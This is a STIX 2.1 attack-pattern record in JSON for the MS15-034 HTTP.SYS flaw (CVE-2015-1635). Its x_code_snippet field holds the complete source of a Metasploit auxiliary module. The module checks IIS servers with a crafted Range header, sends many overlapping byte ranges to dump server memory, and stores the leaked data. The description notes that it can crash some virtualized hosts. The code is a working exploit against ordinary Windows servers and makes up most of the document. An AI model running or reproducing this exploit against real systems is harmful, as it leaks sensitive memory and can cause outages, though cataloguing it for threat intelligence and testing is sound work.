{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--36ba4d1a-d53e-4bb9-93fa-8ef0617c8333",
    "created": "2024-08-14T16:28:49.111459Z",
    "modified": "2024-08-14T16:28:49.111463Z",
    "name": "MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure",
    "description": " This module dumps memory contents using a crafted Range header and affects only Windows 8.1, Server 2012, and Server 2012R2. Note that if the target is running in VMware Workstation, this module has a high likelihood of resulting in BSOD; however, VMware ESX and non-virtualized hosts seem stable. Using a larger target file should result in more memory being dumped, and SSL seems to produce more data as well. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/ms15_034_http_sys_memory_dump.rb",
            "external_id": "ms15_034_http_sys_memory_dump.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1635"
        },
        {
            "source_name": "reference",
            "url": "https://pastebin.com/ypURDPc4"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rapid7/metasploit-framework/pull/5150"
        },
        {
            "source_name": "reference",
            "url": "https://community.qualys.com/blogs/securitylabs/2015/04/20/ms15-034-analyze-and-remote-detection"
        },
        {
            "source_name": "reference",
            "url": "http://www.securitysift.com/an-analysis-of-ms15-034/"
        },
        {
            "source_name": "reference",
            "url": "http://securitysift.com/an-analysis-of-ms15-034/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure',\n      'Description' => %q{\n        This module dumps memory contents using a crafted Range header and affects only\n        Windows 8.1, Server 2012, and Server 2012R2. Note that if the target\n        is running in VMware Workstation, this module has a high likelihood\n        of resulting in BSOD; however, VMware ESX and non-virtualized hosts\n        seem stable. Using a larger target file should result in more memory\n        being dumped, and SSL seems to produce more data as well.\n      },\n      'Author'      =>\n        [\n          'Rich Whitcroft <rwhitcroft[at]gmail.com>', # Msf module\n          'sinn3r',                                   # Some more Metasploit stuff\n          'Sunny Neo <sunny.neo[at]centurioninfosec.sg>' #Added VHOST option\n\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2015-1635'],\n          ['MSB', 'MS15-034'],\n          ['URL', 'https://pastebin.com/ypURDPc4'],\n          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5150'],\n          ['URL', 'https://community.qualys.com/blogs/securitylabs/2015/04/20/ms15-034-analyze-and-remote-detection'],\n          ['URL', 'http://www.securitysift.com/an-analysis-of-ms15-034/'],\n          ['URL', 'http://securitysift.com/an-analysis-of-ms15-034/']\n        ]\n    ))\n\n    register_options([\n      OptString.new('TARGETURI', [false, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', '/']),\n      OptBool.new('SUPPRESS_REQUEST', [ true, 'Suppress output of the requested resource', true ])\n    ])\n\n  end\n\n  def potential_static_files_uris\n    uri = normalize_uri(target_uri.path)\n\n    return [uri] unless uri[-1, 1] == '/'\n\n    uris = [\"#{uri}iisstart.htm\", \"#{uri}iis-85.png\", \"#{uri}welcome.png\"]\n    res  = send_request_raw('uri' => uri)\n\n    return uris unless res\n\n    site_uri = URI.parse(full_uri)\n    page     = Nokogiri::HTML(res.body.encode('UTF-8', invalid: :replace, undef: :replace))\n\n    page.xpath('//link|//script|//style|//img').each do |tag|\n      %w(href src).each do |attribute|\n        attr_value = tag[attribute]\n        next unless attr_value && !attr_value.empty?\n        uri = site_uri.merge(URI::DEFAULT_PARSER.escape(attr_value.strip))\n        next unless uri.host == vhost || uri.host == rhost\n        uris << uri.path if uri.path =~ /\\.[a-z]{2,}$/i # Only keep path with a file\n      end\n    end\n\n    uris.uniq\n  end\n\n  def check_host(ip)\n    upper_range = 0xFFFFFFFFFFFFFFFF\n\n    potential_static_files_uris.each do |potential_uri|\n      uri = normalize_uri(potential_uri)\n\n      res = send_request_raw(\n        'uri' => uri,\n        'method' => 'GET',\n        'headers' => {\n          'Range' => \"bytes=0-#{upper_range}\"\n        }\n      )\n\n      if res && res.body.include?('Requested Range Not Satisfiable')\n        vmessage = \"#{peer} - Checking #{uri} [#{res.code}]\"\n        vprint_status(\"#{vmessage} - Vulnerable\")\n\n        # Save the file that we want to use for the information leak\n        target_uri.path = uri\n\n        return Exploit::CheckCode::Vulnerable\n      elsif res && res.body.include?('The request has an invalid header name')\n        return Exploit::CheckCode::Safe\n      end\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def dump(data)\n    # clear out the returned resource\n    if datastore['SUPPRESS_REQUEST']\n      dump_start = data.index('HTTP/1.1 200 OK')\n      if dump_start\n        data[0..dump_start-1] = ''\n      else\n        print_error(\"Memory dump start position not found, dumping all data instead\")\n      end\n    end\n\n    print_line\n    print_good(\"Memory contents:\")\n    print_line(Rex::Text.to_hex_dump(data))\n  end\n\n  # Needed to allow the vulnerable uri to be shared between the #check and #dos\n  def target_uri\n    @target_uri ||= super\n  end\n\n  def get_file_size\n    @file_size ||= lambda {\n      file_size = -1\n      uri = normalize_uri(target_uri.path)\n      res = send_request_raw('uri' => uri)\n\n      unless res\n        vprint_error(\"Connection timed out\")\n        return file_size\n      end\n\n      if res.code == 404\n        vprint_error(\"You got a 404. URI must be a valid resource.\")\n        return file_size\n      end\n\n      file_size = res.headers['Content-Length'].to_i\n      vprint_status(\"File length: #{file_size} bytes\")\n\n      return file_size\n    }.call\n  end\n\n  def calc_ranges(content_length)\n    ranges = \"bytes=3-18446744073709551615\"\n\n    range_step = 100\n    for range_start in (1..content_length).step(range_step) do\n      range_end = range_start + range_step - 1\n      range_end = content_length if range_end > content_length\n      ranges << \",#{range_start}-#{range_end}\"\n    end\n\n    ranges\n  end\n\n  def run_host(ip)\n    begin\n      vuln_status = check_host(ip)\n      case vuln_status\n      when Exploit::CheckCode::Safe\n        print_error('The target is not exploitable.')\n        return\n      when Exploit::CheckCode::Unknown\n        print_error('Cannot reliably check exploitability! Observe the traffic with HTTPTrace turned on and try to debug.')\n        return\n      when Exploit::CheckCode::Vulnerable\n        print_good('The target is vulnerable.')\n      else\n        print_error('An unknown status code was returned from check_host!')\n        return\n      end\n\n      content_length = get_file_size\n      ranges = calc_ranges(content_length)\n\n      uri = normalize_uri(target_uri.path)\n      cli = Rex::Proto::Http::Client.new(\n        ip,\n        rport,\n        {},\n        datastore['SSL'],\n        datastore['SSLVersion'],\n        nil,\n        datastore['USERNAME'],\n        datastore['PASSWORD']\n      )\n      cli.connect\n      req = cli.request_raw(\n        'uri' => target_uri.path,\n        'method' => 'GET',\n        'vhost' => \"#{datastore['VHOST']}\",\n        'headers' => {\n        'Range' => ranges\n        }\n      )\n      cli.send_request(req)\n\n      print_good(\"Stand by...\")\n\n      resp = cli.read_response\n\n      if resp\n        dump(resp.to_s)\n        loot_path = store_loot('iis.ms15034', 'application/octet-stream', ip, resp, nil, 'MS15-034 HTTP.SYS Memory Dump')\n        print_good(\"Memory dump saved to #{loot_path}\")\n      else\n        print_error(\"Disclosure unsuccessful (must be 8.1, 2012, or 2012R2)\")\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_error(\"Unable to connect\")\n      return\n    rescue ::Timeout::Error, ::Errno::EPIPE\n      print_error(\"Timeout receiving from socket\")\n      return\n    ensure\n      cli.close if cli\n    end\n  end\nend\n"
}